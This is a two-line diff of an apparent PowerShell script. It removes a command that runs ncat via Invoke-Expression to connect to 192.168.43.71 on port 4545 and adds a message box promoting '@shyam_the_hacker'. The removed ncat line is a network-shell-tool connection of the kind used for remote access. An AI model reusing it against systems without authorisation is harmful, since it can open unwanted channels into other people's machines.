@@ -1,2 +1,2 @@
-# Connect to 192.168.43.71 on port 4545 using ncat
-Invoke-Expression "ncat.exe -v -p 4545 192.168.43.71"
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.MessageBox]::Show('Follow @shyam_the_hacker', 'Message')
